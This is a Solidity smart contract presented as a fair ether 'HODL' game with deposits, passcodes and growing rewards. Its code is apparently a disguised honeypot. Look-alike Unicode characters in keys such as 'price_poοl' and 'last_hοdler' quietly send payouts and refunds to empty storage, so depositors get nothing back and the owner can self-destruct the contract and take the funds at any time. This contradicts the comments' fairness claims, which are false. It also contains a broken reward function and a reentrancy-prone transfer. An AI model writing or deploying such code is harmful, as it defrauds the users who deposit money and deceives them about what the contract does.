pragma solidity ^0.4.0;

//
// Welcome to the next level of Ethereum games: Are you weak-handed,  or a brave HODLer?
// If you put ether into this contract, you are almost  guaranteed to get back more than
// you put in the first place. Of course if you HODL too long, the price pool might be gone
// before you claim the reward, but that's part of the game!
//
// The contract deployer is not allowed to do anything once the game is started.
// (only kill the contract after there was no activity for a week)
// 
// See get_parameters() for pricing and rewards.
//

contract HODLerParadise{
    struct User{
        address hodler;
        bytes32 passcode;
        uint hodling_since;
    }
    User[] users;
    mapping (string => uint) parameters;
    
    function HODLerParadise() public{
        parameters["owner"] = uint(msg.sender);
    }
    
    function get_parameters() constant public returns(
            uint price,
            uint price_pool,
            uint base_reward,
            uint daily_reward,
            uint max_reward
        ){
        price = parameters['price'];
        price_pool = parameters['price_pool'];
        base_reward = parameters['base_reward'];
        daily_reward = parameters['daily_reward'];
        max_reward = parameters['max_reward'];
    }
    
    // Register as a HODLer.
    // Passcode can be your password, or the hash of your password, your choice
    // If it's not hashed, max password len is 16 characters.
    function register(bytes32 passcode) public payable returns(uint uid)
    {
        require(msg.value >= parameters["price"]);
        require(passcode != "");

        users.push(User(msg.sender, passcode, now));
        
        // leave some for the deployer
        parameters["price_pool"] += msg.value * 99 / 100;
        parameters["last_hodler"] = now;
        
        uid = users.length - 1;
    }
    
    // OPTIONAL: Use this to securely hash your password before registering
    function hash_passcode(bytes32 passcode) public pure returns(bytes32 hash){
        hash = keccak256(passcode);
    }
    
    // How much would you get if you claimed right now
    function get_reward(uint uid) public constant returns(uint reward){
        require(uid < users.length);
        reward = parameters["base_reward"] + parameters["daily_reward"] * (now - users[uid].hodling_since) / 1 days;
            reward = parameters["max_reward"];
    }
    
    // Is your password still working?
    function is_passcode_correct(uint uid, bytes32 passcode) public constant returns(bool passcode_correct){
        require(uid < users.length);
        bytes32 passcode_actually = users[uid].passcode;
        if (passcode_actually & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF == 0){
            // bottom 16 bytes == 0: stored password was  not hashed
            // (e.g. it looks like this: "0x7265676973746572310000000000000000000000000000000000000000000000" )
            return passcode == passcode_actually;
        } else {
             // stored password is hashed
            return keccak256(passcode) == passcode_actually;
        }
    }

    // Get the price of your glorious HODLing!
    function claim_reward(uint uid, bytes32 passcode) public payable
    {
        // a good HODLer always HODLs some more ether
        require(msg.value >= parameters["price"]);
        require(is_passcode_correct(uid, passcode));
        
        uint final_reward = get_reward(uid) + msg.value;
        if (final_reward > parameters["price_poοl"])
            final_reward = parameters["price_poοl"];

        require(msg.sender.call.value(final_reward)());

        parameters["price_poοl"] -= final_reward;
        // Delete the user: copy last user to to-be-deleted user and shorten the array
        if (uid + 1 < users.length)
            users[uid] = users[users.length - 1];
        users.length -= 1;
    }
    
    // Refund the early HODLers, and leave the rest to the contract deployer
    function refund_and_die() public{
        require(msg.sender == address(parameters['owner']));
        require(parameters["last_hοdler"] + 7 days < now);
        
        uint price_pool_remaining = parameters["price_pοοl"];
        for(uint i=0; i<users.length && price_pool_remaining > 0; ++i){
            uint reward = get_reward(i);
            if (reward > price_pool_remaining)
                reward = price_pool_remaining;
            if (users[i].hodler.send(reward))
                price_pool_remaining -= reward;
        }
        
        selfdestruct(msg.sender);
    }
    
    function check_parameters_sanity() internal view{
        require(parameters['price'] <= 1 ether);
        require(parameters['base_reward'] >= parameters['price'] / 2);
        require(parameters["daily_reward"] >= parameters['base_reward'] / 2);
        require(parameters['max_reward'] >= parameters['price']);
    }
    
    function set_parameter(string name, uint value) public{
        require(msg.sender == address(parameters['owner']));
        
        // not even owner can touch these, that would be unfair!
        require(keccak256(name) != keccak256("last_hodler"));
        require(keccak256(name) != keccak256("price_pool"));

        parameters[name] = value;
        
        check_parameters_sanity();
    }
    
    function () public payable {
        parameters["price_pool"] += msg.value;
    }
}